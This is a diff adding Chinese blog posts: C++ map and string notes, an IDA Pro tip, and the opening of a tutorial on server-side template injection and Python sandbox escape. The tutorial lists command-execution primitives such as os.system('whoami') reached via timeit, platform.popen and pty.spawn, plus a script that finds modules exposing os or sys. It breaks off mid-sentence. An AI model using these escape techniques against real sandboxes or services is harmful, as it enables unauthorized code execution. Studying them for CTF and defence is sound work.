@@ -64,6 +64,666 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-C-std" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/09/26/C-std/" class="article-date">
+  <time datetime="2020-09-26T12:41:12.000Z" itemprop="datePublished">2020-09-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/09/26/C-std/">C++ std</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>map</p>
+<p>//遍历</p>
+<p>#include <iostream><br>#include <map><br>using namespace std;<br>int main() {<br>    map&lt;int,int&gt; p;<br>    p[0] = 1;<br>    p[1] = 2;<br>    p[3] = 4;<br>    map&lt;int,int&gt;::iterator it;<br>    for(it = p.begin(); it != p.end(); it++) {<br>        cout&lt;<it->first&lt;&lt;” “&lt;<it->second&lt;&lt;endl;<br>    }<br>    return 0;<br>}</p>
+<p>//插入元素3种方法<br> 第一种：用insert函数插入pair数据 </p>
+<p>map&lt;int, string&gt; mapStudent;</p>
+<p>mapStudent.insert(pair&lt;int, string&gt;(1, “student_one”));</p>
+<p> 第二种：用insert函数插入value_type数据 </p>
+<p>map&lt;int, string&gt; mapStudent;</p>
+<p>mapStudent.insert(map&lt;int, string&gt;::value_type (1, “student_one”));</p>
+<p>第三种：用数组方式插入数据 </p>
+<p>map&lt;int, string&gt; mapStudent;</p>
+<p>mapStudent[1] = “student_one”;</p>
+<p>mapStudent[2] = “student_two”; </p>
+<p>mapStudent[3] = “student_three”;</p>
+<h1 id="C风格字符串和C-风格字符串转换"><a href="#C风格字符串和C-风格字符串转换" class="headerlink" title="C风格字符串和C++风格字符串转换"></a>C风格字符串和C++风格字符串转换</h1><h4 id="一、C风格—-gt-C-风格"><a href="#一、C风格—-gt-C-风格" class="headerlink" title="一、C风格—&gt;C++风格"></a>一、C风格—&gt;C++风格</h4><pre><code>char c[] = &quot;hello world&quot;;
+string s(c);
+
+cout &lt;&lt; s &lt;&lt; endl;  //hello world</code></pre><h4 id="二、C-风格—-gt-C风格"><a href="#二、C-风格—-gt-C风格" class="headerlink" title="二、C++风格—&gt;C风格"></a>二、C++风格—&gt;C风格</h4><pre><code>int i;
+string s = &quot;hello world&quot;;
+const char *p = s.c_str();  //const不能省去！
+
+for (i = 0; i &lt; s.length(); i++) {
+    cout &lt;&lt; p[i];  //hello world
+}</code></pre><h4 id="三、C和C-在终端获取一整行字符串"><a href="#三、C和C-在终端获取一整行字符串" class="headerlink" title="三、C和C++在终端获取一整行字符串"></a>三、C和C++在终端获取<code>一整行</code>字符串</h4><p><strong>C++中：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> s;</span><br><span class="line">getline(<span class="built_in">cin</span>, s);<span class="number">12</span></span><br></pre></td></tr></table></figure>
+
+<p>getline会读取一整行字符串（包括空格），而如果使用: cin &gt;&gt; s; 那么遇到空格将停止读取。</p>
+<p><strong>C中：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">gets(c);<span class="number">12</span></span><br></pre></td></tr></table></figure>
+
+<p>gets也会读取空格。利用puts输出即可。而如果使用: scanf(“%s”, c); 也是遇到空格停止读取。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/09/26/C-std/" data-id="ckfjo92460000ywelffnec92q" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-ida-pro" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/08/19/ida-pro/" class="article-date">
+  <time datetime="2020-08-19T02:24:28.000Z" itemprop="datePublished">2020-08-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/19/ida-pro/">ida pro</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>32 位文件要用32位 ida打开</p>
+<p>64 位文件要用64位 ida打开</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/08/19/ida-pro/" data-id="ckfjo92570002ywelezmy4sgd" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-ssti" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/08/07/ssti/" class="article-date">
+  <time datetime="2020-08-07T08:14:59.000Z" itemprop="datePublished">2020-08-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/07/ssti/">ssti</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><del>顾名思义，服务端模板注入，就是通过在<strong>服务端</strong>的<strong>模板文件</strong>或<strong>模板字符串</strong>中注入特定的恶意代码导致产生代码执行的一种漏洞攻击方式。</del></p>
+<p>不同的模板引擎，根据不同的解析方式相应的也是存在不同的利用方法。</p>
+<p>正常而言，出于安全考虑，模板引擎基本上都是拥有沙盒、命名空间的，代码的解析执行都是发生在有限的沙盒里面，因此，沙盒逃逸也成为 SSTI 不可或缺的存在。</p>
+<h2 id="Python-Web-模板引擎"><a href="#Python-Web-模板引擎" class="headerlink" title="Python Web 模板引擎"></a>Python Web 模板引擎</h2><ul>
+<li><input checked="" disabled="" type="checkbox"> Jinja2</li>
+<li><input checked="" disabled="" type="checkbox"> Tornado.template</li>
+<li><input disabled="" type="checkbox"> Django.template</li>
+</ul>
+<p> <img src="https://img2018.cnblogs.com/i-beta/1828215/202002/1828215-20200216115106949-1035150176.png" alt="img"> </p>
+<p><strong>让用户提交 Python 代码并在服务器上执行，是一些 OJ、量化网站重要的服务，很多 CTF 也有类似的题。为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数，例如 os，研究怎么逃逸、防护这类沙箱还是蛮有意思的。</strong></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Python 的沙箱逃逸的最终目标就是执行系统任意命令，次一点的写文件，再次一点的读文件。</p>
+<p>顺便安利一本书：《流畅的 Python》。这本书有很多中高阶知识点，很全面而且讲的很清楚，如果你看过，相信理解这篇文章的大多数内容都不是问题。</p>
+<p>接下来的内容先讲系统命令执行，再讲文件写入、读取，并且均以 oj 为例，库大多以 <code>os</code> 为例。</p>
+<h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>先啰嗦一些基础知识</p>
+<p>在 Python 中执行系统命令的方式有：</p>
+<blockquote>
+<p>os</p>
+<p>commands：仅限<code>2.x</code></p>
+<p>subprocess</p>
+<p>timeit：<code>timeit.sys</code>、<code>timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;, number=1)</code></p>
+<p>platform：<code>platform.os</code>、<code>platform.sys</code>、<code>platform.popen(&#39;whoami&#39;, mode=&#39;r&#39;, bufsize=-1).read()</code></p>
+<p>pty：<code>pty.spawn(&#39;ls&#39;)</code>、<code>pty.os</code></p>
+<p>bdb：<code>bdb.os</code>、<code>cgi.sys</code></p>
+<p>cgi：<code>cgi.os</code>、<code>cgi.sys</code></p>
+<p>…</p>
+</blockquote>
+<p>我写了一个脚本，测试了一下所有的导入 <code>os</code> 或者 <code>sys</code> 的库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8 -*-</span><br><span class="line"># By Macr0phag3</span><br><span class="line"># in 2019-05-07 19:46:12</span><br><span class="line"># ------------------------------------</span><br><span class="line"></span><br><span class="line"># this, antigravity 库删掉</span><br><span class="line">all_modules_2 &#x3D; [</span><br><span class="line">    &#39;BaseHTTPServer&#39;, &#39;imaplib&#39;, &#39;shelve&#39;, &#39;Bastion&#39;, &#39;anydbm&#39;, &#39;imghdr&#39;, &#39;shlex&#39;, &#39;CDROM&#39;, &#39;argparse&#39;, &#39;imp&#39;, &#39;shutil&#39;, &#39;CGIHTTPServer&#39;, &#39;array&#39;, &#39;importlib&#39;, &#39;signal&#39;, &#39;Canvas&#39;, &#39;ast&#39;, &#39;imputil&#39;, &#39;site&#39;, &#39;ConfigParser&#39;, &#39;asynchat&#39;, &#39;inspect&#39;, &#39;sitecustomize&#39;, &#39;Cookie&#39;, &#39;asyncore&#39;, &#39;io&#39;, &#39;smtpd&#39;, &#39;DLFCN&#39;, &#39;atexit&#39;, &#39;itertools&#39;, &#39;smtplib&#39;, &#39;Dialog&#39;, &#39;audiodev&#39;, &#39;json&#39;, &#39;sndhdr&#39;, &#39;DocXMLRPCServer&#39;, &#39;audioop&#39;, &#39;keyword&#39;, &#39;socket&#39;, &#39;FileDialog&#39;, &#39;base64&#39;, &#39;lib2to3&#39;, &#39;spwd&#39;, &#39;FixTk&#39;, &#39;bdb&#39;, &#39;linecache&#39;, &#39;sqlite3&#39;, &#39;HTMLParser&#39;, &#39;binascii&#39;, &#39;linuxaudiodev&#39;, &#39;sre&#39;, &#39;IN&#39;, &#39;binhex&#39;, &#39;locale&#39;, &#39;sre_compile&#39;, &#39;MimeWriter&#39;, &#39;bisect&#39;, &#39;logging&#39;, &#39;sre_constants&#39;, &#39;Queue&#39;, &#39;bsddb&#39;, &#39;lsb_release&#39;, &#39;sre_parse&#39;, &#39;ScrolledText&#39;, &#39;bz2&#39;, &#39;macpath&#39;, &#39;ssl&#39;, &#39;SimpleDialog&#39;, &#39;cPickle&#39;, &#39;macurl2path&#39;, &#39;stat&#39;, &#39;SimpleHTTPServer&#39;, &#39;cProfile&#39;, &#39;mailbox&#39;, &#39;statvfs&#39;, &#39;SimpleXMLRPCServer&#39;, &#39;cStringIO&#39;, &#39;mailcap&#39;, &#39;string&#39;, &#39;SocketServer&#39;, &#39;calendar&#39;, &#39;markupbase&#39;, &#39;stringold&#39;, &#39;StringIO&#39;, &#39;cgi&#39;, &#39;marshal&#39;, &#39;stringprep&#39;, &#39;TYPES&#39;, &#39;cgitb&#39;, &#39;math&#39;, &#39;strop&#39;, &#39;Tix&#39;, &#39;chunk&#39;, &#39;md5&#39;, &#39;struct&#39;, &#39;Tkconstants&#39;, &#39;cmath&#39;, &#39;mhlib&#39;, &#39;subprocess&#39;, &#39;Tkdnd&#39;, &#39;cmd&#39;, &#39;mimetools&#39;, &#39;sunau&#39;, &#39;Tkinter&#39;, &#39;code&#39;, &#39;mimetypes&#39;, &#39;sunaudio&#39;, &#39;UserDict&#39;, &#39;codecs&#39;, &#39;mimify&#39;, &#39;symbol&#39;, &#39;UserList&#39;, &#39;codeop&#39;, &#39;mmap&#39;, &#39;symtable&#39;, &#39;UserString&#39;, &#39;collections&#39;, &#39;modulefinder&#39;, &#39;sys&#39;, &#39;_LWPCookieJar&#39;, &#39;colorsys&#39;, &#39;multifile&#39;, &#39;sysconfig&#39;, &#39;_MozillaCookieJar&#39;, &#39;commands&#39;, &#39;multiprocessing&#39;, &#39;syslog&#39;, &#39;__builtin__&#39;, &#39;compileall&#39;, &#39;mutex&#39;, &#39;tabnanny&#39;, &#39;__future__&#39;, &#39;compiler&#39;, &#39;netrc&#39;, &#39;talloc&#39;, &#39;_abcoll&#39;, &#39;contextlib&#39;, &#39;new&#39;, &#39;tarfile&#39;, &#39;_ast&#39;, &#39;cookielib&#39;, &#39;nis&#39;, &#39;telnetlib&#39;, &#39;_bisect&#39;, &#39;copy&#39;, &#39;nntplib&#39;, &#39;tempfile&#39;, &#39;_bsddb&#39;, &#39;copy_reg&#39;, &#39;ntpath&#39;, &#39;termios&#39;, &#39;_codecs&#39;, &#39;crypt&#39;, &#39;nturl2path&#39;, &#39;test&#39;, &#39;_codecs_cn&#39;, &#39;csv&#39;, &#39;numbers&#39;, &#39;textwrap&#39;, &#39;_codecs_hk&#39;, &#39;ctypes&#39;, &#39;opcode&#39;, &#39;_codecs_iso2022&#39;, &#39;curses&#39;, &#39;operator&#39;, &#39;thread&#39;, &#39;_codecs_jp&#39;, &#39;datetime&#39;, &#39;optparse&#39;, &#39;threading&#39;, &#39;_codecs_kr&#39;, &#39;dbhash&#39;, &#39;os&#39;, &#39;time&#39;, &#39;_codecs_tw&#39;, &#39;dbm&#39;, &#39;os2emxpath&#39;, &#39;timeit&#39;, &#39;_collections&#39;, &#39;decimal&#39;, &#39;ossaudiodev&#39;, &#39;tkColorChooser&#39;, &#39;_csv&#39;, &#39;difflib&#39;, &#39;parser&#39;, &#39;tkCommonDialog&#39;, &#39;_ctypes&#39;, &#39;dircache&#39;, &#39;pdb&#39;, &#39;tkFileDialog&#39;, &#39;_ctypes_test&#39;, &#39;dis&#39;, &#39;pickle&#39;, &#39;tkFont&#39;, &#39;_curses&#39;, &#39;distutils&#39;, &#39;pickletools&#39;, &#39;tkMessageBox&#39;, &#39;_curses_panel&#39;, &#39;doctest&#39;, &#39;pipes&#39;, &#39;tkSimpleDialog&#39;, &#39;_elementtree&#39;, &#39;dumbdbm&#39;, &#39;pkgutil&#39;, &#39;toaiff&#39;, &#39;_functools&#39;, &#39;dummy_thread&#39;, &#39;platform&#39;, &#39;token&#39;, &#39;_hashlib&#39;, &#39;dummy_threading&#39;, &#39;plistlib&#39;, &#39;tokenize&#39;, &#39;_heapq&#39;, &#39;email&#39;, &#39;popen2&#39;, &#39;trace&#39;, &#39;_hotshot&#39;, &#39;encodings&#39;, &#39;poplib&#39;, &#39;traceback&#39;, &#39;_io&#39;, &#39;ensurepip&#39;, &#39;posix&#39;, &#39;ttk&#39;, &#39;_json&#39;, &#39;errno&#39;, &#39;posixfile&#39;, &#39;tty&#39;, &#39;_locale&#39;, &#39;exceptions&#39;, &#39;posixpath&#39;, &#39;turtle&#39;, &#39;_lsprof&#39;, &#39;fcntl&#39;, &#39;pprint&#39;, &#39;types&#39;, &#39;_md5&#39;, &#39;filecmp&#39;, &#39;profile&#39;, &#39;unicodedata&#39;, &#39;_multibytecodec&#39;, &#39;fileinput&#39;, &#39;pstats&#39;, &#39;unittest&#39;, &#39;_multiprocessing&#39;, &#39;fnmatch&#39;, &#39;pty&#39;, &#39;urllib&#39;, &#39;_osx_support&#39;, &#39;formatter&#39;, &#39;pwd&#39;, &#39;urllib2&#39;, &#39;_pyio&#39;, &#39;fpformat&#39;, &#39;py_compile&#39;, &#39;urlparse&#39;, &#39;_random&#39;, &#39;fractions&#39;, &#39;pyclbr&#39;, &#39;user&#39;, &#39;_sha&#39;, &#39;ftplib&#39;, &#39;pydoc&#39;, &#39;uu&#39;, &#39;_sha256&#39;, &#39;functools&#39;, &#39;pydoc_data&#39;, &#39;uuid&#39;, &#39;_sha512&#39;, &#39;future_builtins&#39;, &#39;pyexpat&#39;, &#39;warnings&#39;, &#39;_socket&#39;, &#39;gc&#39;, &#39;quopri&#39;, &#39;wave&#39;, &#39;_sqlite3&#39;, &#39;genericpath&#39;, &#39;random&#39;, &#39;weakref&#39;, &#39;_sre&#39;, &#39;getopt&#39;, &#39;re&#39;, &#39;webbrowser&#39;, &#39;_ssl&#39;, &#39;getpass&#39;, &#39;readline&#39;, &#39;whichdb&#39;, &#39;_strptime&#39;, &#39;gettext&#39;, &#39;repr&#39;, &#39;wsgiref&#39;, &#39;_struct&#39;, &#39;glob&#39;, &#39;resource&#39;, &#39;xdrlib&#39;, &#39;_symtable&#39;, &#39;grp&#39;, &#39;rexec&#39;, &#39;xml&#39;, &#39;_sysconfigdata&#39;, &#39;gzip&#39;, &#39;rfc822&#39;, &#39;xmllib&#39;, &#39;_sysconfigdata_nd&#39;, &#39;hashlib&#39;, &#39;rlcompleter&#39;, &#39;xmlrpclib&#39;, &#39;_testcapi&#39;, &#39;heapq&#39;, &#39;robotparser&#39;, &#39;xxsubtype&#39;, &#39;_threading_local&#39;, &#39;hmac&#39;, &#39;runpy&#39;, &#39;zipfile&#39;, &#39;_warnings&#39;, &#39;hotshot&#39;, &#39;sched&#39;, &#39;zipimport&#39;, &#39;_weakref&#39;, &#39;htmlentitydefs&#39;, &#39;select&#39;, &#39;zlib&#39;, &#39;_weakrefset&#39;, &#39;htmllib&#39;, &#39;sets&#39;, &#39;abc&#39;, &#39;httplib&#39;, &#39;sgmllib&#39;, &#39;aifc&#39;, &#39;ihooks&#39;, &#39;sha&#39;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">all_modules_3 &#x3D; [</span><br><span class="line">    &#39;AptUrl&#39;, &#39;hmac&#39;, &#39;requests_unixsocket&#39;, &#39;CommandNotFound&#39;, &#39;apport&#39;, &#39;hpmudext&#39;, &#39;resource&#39;, &#39;Crypto&#39;, &#39;apport_python_hook&#39;, &#39;html&#39;, &#39;rlcompleter&#39;, &#39;DistUpgrade&#39;, &#39;apt&#39;, &#39;http&#39;, &#39;runpy&#39;, &#39;HweSupportStatus&#39;, &#39;apt_inst&#39;, &#39;httplib2&#39;, &#39;scanext&#39;, &#39;LanguageSelector&#39;, &#39;apt_pkg&#39;, &#39;idna&#39;, &#39;sched&#39;, &#39;NvidiaDetector&#39;, &#39;aptdaemon&#39;, &#39;imaplib&#39;, &#39;secrets&#39;, &#39;PIL&#39;, &#39;aptsources&#39;, &#39;imghdr&#39;, &#39;secretstorage&#39;, &#39;Quirks&#39;, &#39;argparse&#39;, &#39;imp&#39;, &#39;select&#39;, &#39;UbuntuDrivers&#39;, &#39;array&#39;, &#39;importlib&#39;, &#39;selectors&#39;, &#39;UbuntuSystemService&#39;, &#39;asn1crypto&#39;, &#39;inspect&#39;, &#39;shelve&#39;, &#39;UpdateManager&#39;, &#39;ast&#39;, &#39;io&#39;, &#39;shlex&#39;, &#39;__future__&#39;, &#39;asynchat&#39;, &#39;ipaddress&#39;, &#39;shutil&#39;, &#39;_ast&#39;, &#39;asyncio&#39;, &#39;itertools&#39;, &#39;signal&#39;, &#39;_asyncio&#39;, &#39;asyncore&#39;, &#39;janitor&#39;, &#39;simplejson&#39;, &#39;_bisect&#39;, &#39;atexit&#39;, &#39;json&#39;, &#39;site&#39;, &#39;_blake2&#39;, &#39;audioop&#39;, &#39;keyring&#39;, &#39;sitecustomize&#39;, &#39;_bootlocale&#39;, &#39;base64&#39;, &#39;keyword&#39;, &#39;six&#39;, &#39;_bz2&#39;, &#39;bdb&#39;, &#39;language_support_pkgs&#39;, &#39;smtpd&#39;, &#39;_cffi_backend&#39;, &#39;binascii&#39;, &#39;launchpadlib&#39;, &#39;smtplib&#39;, &#39;_codecs&#39;, &#39;binhex&#39;, &#39;linecache&#39;, &#39;sndhdr&#39;, &#39;_codecs_cn&#39;, &#39;bisect&#39;, &#39;locale&#39;, &#39;socket&#39;, &#39;_codecs_hk&#39;, &#39;brlapi&#39;, &#39;logging&#39;, &#39;socketserver&#39;, &#39;_codecs_iso2022&#39;, &#39;builtins&#39;, &#39;louis&#39;, &#39;softwareproperties&#39;, &#39;_codecs_jp&#39;, &#39;bz2&#39;, &#39;lsb_release&#39;, &#39;speechd&#39;, &#39;_codecs_kr&#39;, &#39;cProfile&#39;, &#39;lzma&#39;, &#39;speechd_config&#39;, &#39;_codecs_tw&#39;, &#39;cairo&#39;, &#39;macaroonbakery&#39;, &#39;spwd&#39;, &#39;_collections&#39;, &#39;calendar&#39;, &#39;macpath&#39;, &#39;sqlite3&#39;, &#39;_collections_abc&#39;, &#39;certifi&#39;, &#39;macurl2path&#39;, &#39;sre_compile&#39;, &#39;_compat_pickle&#39;, &#39;cgi&#39;, &#39;mailbox&#39;, &#39;sre_constants&#39;, &#39;_compression&#39;, &#39;cgitb&#39;, &#39;mailcap&#39;, &#39;sre_parse&#39;, &#39;_crypt&#39;, &#39;chardet&#39;, &#39;mako&#39;, &#39;ssl&#39;, &#39;_csv&#39;, &#39;chunk&#39;, &#39;markupsafe&#39;, &#39;stat&#39;, &#39;_ctypes&#39;, &#39;cmath&#39;, &#39;marshal&#39;, &#39;statistics&#39;, &#39;_ctypes_test&#39;, &#39;cmd&#39;, &#39;math&#39;, &#39;string&#39;, &#39;_curses&#39;, &#39;code&#39;, &#39;mimetypes&#39;, &#39;stringprep&#39;, &#39;_curses_panel&#39;, &#39;codecs&#39;, &#39;mmap&#39;, &#39;struct&#39;, &#39;_datetime&#39;, &#39;codeop&#39;, &#39;modual_test&#39;, &#39;subprocess&#39;, &#39;_dbm&#39;, &#39;collections&#39;, &#39;modulefinder&#39;, &#39;sunau&#39;, &#39;_dbus_bindings&#39;, &#39;colorsys&#39;, &#39;multiprocessing&#39;, &#39;symbol&#39;, &#39;_dbus_glib_bindings&#39;, &#39;compileall&#39;, &#39;nacl&#39;, &#39;symtable&#39;, &#39;_decimal&#39;, &#39;concurrent&#39;, &#39;netrc&#39;, &#39;sys&#39;, &#39;_dummy_thread&#39;, &#39;configparser&#39;, &#39;nis&#39;, &#39;sysconfig&#39;, &#39;_elementtree&#39;, &#39;contextlib&#39;, &#39;nntplib&#39;, &#39;syslog&#39;, &#39;_functools&#39;, &#39;copy&#39;, &#39;ntpath&#39;, &#39;systemd&#39;, &#39;_gdbm&#39;, &#39;copyreg&#39;, &#39;nturl2path&#39;, &#39;tabnanny&#39;, &#39;_hashlib&#39;, &#39;crypt&#39;, &#39;numbers&#39;, &#39;tarfile&#39;, &#39;_heapq&#39;, &#39;cryptography&#39;, &#39;oauth&#39;, &#39;telnetlib&#39;, &#39;_imp&#39;, &#39;csv&#39;, &#39;olefile&#39;, &#39;tempfile&#39;, &#39;_io&#39;, &#39;ctypes&#39;, &#39;opcode&#39;, &#39;termios&#39;, &#39;_json&#39;, &#39;cups&#39;, &#39;operator&#39;, &#39;test&#39;, &#39;_locale&#39;, &#39;cupsext&#39;, &#39;optparse&#39;, &#39;textwrap&#39;, &#39;_lsprof&#39;, &#39;cupshelpers&#39;, &#39;orca&#39;, &#39;_lzma&#39;, &#39;curses&#39;, &#39;os&#39;, &#39;threading&#39;, &#39;_markupbase&#39;, &#39;datetime&#39;, &#39;ossaudiodev&#39;, &#39;time&#39;, &#39;_md5&#39;, &#39;dbm&#39;, &#39;parser&#39;, &#39;timeit&#39;, &#39;_multibytecodec&#39;, &#39;dbus&#39;, &#39;pathlib&#39;, &#39;token&#39;, &#39;_multiprocessing&#39;, &#39;deb822&#39;, &#39;pcardext&#39;, &#39;tokenize&#39;, &#39;_opcode&#39;, &#39;debconf&#39;, &#39;pdb&#39;, &#39;trace&#39;, &#39;_operator&#39;, &#39;debian&#39;, &#39;pexpect&#39;, &#39;traceback&#39;, &#39;_osx_support&#39;, &#39;debian_bundle&#39;, &#39;pickle&#39;, &#39;tracemalloc&#39;, &#39;_pickle&#39;, &#39;decimal&#39;, &#39;pickletools&#39;, &#39;tty&#39;, &#39;_posixsubprocess&#39;, &#39;defer&#39;, &#39;pipes&#39;, &#39;turtle&#39;, &#39;_pydecimal&#39;, &#39;difflib&#39;, &#39;pkg_resources&#39;, &#39;types&#39;, &#39;_pyio&#39;, &#39;dis&#39;, &#39;pkgutil&#39;, &#39;typing&#39;, &#39;_random&#39;, &#39;distro_info&#39;, &#39;platform&#39;, &#39;ufw&#39;, &#39;_sha1&#39;, &#39;distro_info_test&#39;, &#39;plistlib&#39;, &#39;unicodedata&#39;, &#39;_sha256&#39;, &#39;distutils&#39;, &#39;poplib&#39;, &#39;unittest&#39;, &#39;_sha3&#39;, &#39;doctest&#39;, &#39;posix&#39;, &#39;urllib&#39;, &#39;_sha512&#39;, &#39;dummy_threading&#39;, &#39;posixpath&#39;, &#39;urllib3&#39;, &#39;_signal&#39;, &#39;email&#39;, &#39;pprint&#39;, &#39;usbcreator&#39;, &#39;_sitebuiltins&#39;, &#39;encodings&#39;, &#39;problem_report&#39;, &#39;uu&#39;, &#39;_socket&#39;, &#39;enum&#39;, &#39;profile&#39;, &#39;uuid&#39;, &#39;_sqlite3&#39;, &#39;errno&#39;, &#39;pstats&#39;, &#39;venv&#39;, &#39;_sre&#39;, &#39;faulthandler&#39;, &#39;pty&#39;, &#39;wadllib&#39;, &#39;_ssl&#39;, &#39;fcntl&#39;, &#39;ptyprocess&#39;, &#39;warnings&#39;, &#39;_stat&#39;, &#39;filecmp&#39;, &#39;pwd&#39;, &#39;wave&#39;, &#39;_string&#39;, &#39;fileinput&#39;, &#39;py_compile&#39;, &#39;weakref&#39;, &#39;_strptime&#39;, &#39;fnmatch&#39;, &#39;pyatspi&#39;, &#39;webbrowser&#39;, &#39;_struct&#39;, &#39;formatter&#39;, &#39;pyclbr&#39;, &#39;wsgiref&#39;, &#39;_symtable&#39;, &#39;fractions&#39;, &#39;pydoc&#39;, &#39;xdg&#39;, &#39;_sysconfigdata_m_linux_x86_64-linux-gnu&#39;, &#39;ftplib&#39;, &#39;pydoc_data&#39;, &#39;xdrlib&#39;, &#39;_testbuffer&#39;, &#39;functools&#39;, &#39;pyexpat&#39;, &#39;xkit&#39;, &#39;_testcapi&#39;, &#39;gc&#39;, &#39;pygtkcompat&#39;, &#39;xml&#39;, &#39;_testimportmultiple&#39;, &#39;genericpath&#39;, &#39;pymacaroons&#39;, &#39;xmlrpc&#39;, &#39;_testmultiphase&#39;, &#39;getopt&#39;, &#39;pyrfc3339&#39;, &#39;xxlimited&#39;, &#39;_thread&#39;, &#39;getpass&#39;, &#39;pytz&#39;, &#39;xxsubtype&#39;, &#39;_threading_local&#39;, &#39;gettext&#39;, &#39;queue&#39;, &#39;yaml&#39;, &#39;_tracemalloc&#39;, &#39;gi&#39;, &#39;quopri&#39;, &#39;zipapp&#39;, &#39;_warnings&#39;, &#39;glob&#39;, &#39;random&#39;, &#39;zipfile&#39;, &#39;_weakref&#39;, &#39;grp&#39;, &#39;re&#39;, &#39;zipimport&#39;, &#39;_weakrefset&#39;, &#39;gtweak&#39;, &#39;readline&#39;, &#39;zlib&#39;, &#39;_yaml&#39;, &#39;gzip&#39;, &#39;reportlab&#39;, &#39;zope&#39;, &#39;abc&#39;, &#39;hashlib&#39;, &#39;reprlib&#39;, &#39;aifc&#39;, &#39;heapq&#39;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">methods &#x3D; [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;]</span><br><span class="line"></span><br><span class="line">results &#x3D; &#123;&#125;</span><br><span class="line">for module in all_modules_3:</span><br><span class="line">    results[module] &#x3D; &#123;</span><br><span class="line">        &#39;flag&#39;: 0,</span><br><span class="line">        &#39;result&#39;: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        m &#x3D; __import__(module)</span><br><span class="line">        attrs &#x3D; dir(m)</span><br><span class="line">        for method in methods:</span><br><span class="line">            if method in attrs:</span><br><span class="line">                result &#x3D; &#39;yes&#39;</span><br><span class="line">                results[module][&#39;flag&#39;] &#x3D; 1</span><br><span class="line">            else:</span><br><span class="line">                result &#x3D; &#39;no&#39;</span><br><span class="line"></span><br><span class="line">            results[module][&#39;result&#39;][method] &#x3D; result</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line">for result in results:</span><br><span class="line">    if results[result][&#39;flag&#39;]:</span><br><span class="line">        print(&#39;[+]&#39; + result)</span><br><span class="line">        for r in results[result][&#39;result&#39;]:</span><br><span class="line">            print(&#39;  [-]&#39; + r + &#39;: &#39; + results[result][&#39;result&#39;][r])</span><br></pre></td></tr></table></figure>
+
+<p><code>all_modules_2</code>就是 2.x 的标准库，<code>all_modules_3</code> 就是 3.x 的标准库。</p>
+<p>结果相当多，这里就不贴了。这里注意一下，这个文件别命名为 <code>test.py</code>，如果命名为 test 会怎么样呢？可以先猜一猜，后面会给解释。</p>
+<p>如果 oj 支持 <code>import</code> 的话，这些库都是高危的，放任不管基本上是坐等被日。所以为了避免过滤不完善导致各种问题，在 Python 沙箱套一层 docker 肯定不会是坏事。</p>
+<h3 id="花式-import"><a href="#花式-import" class="headerlink" title="花式 import"></a>花式 import</h3><p>首先，禁用 <code>import os</code> 肯定是不行的，因为</p>
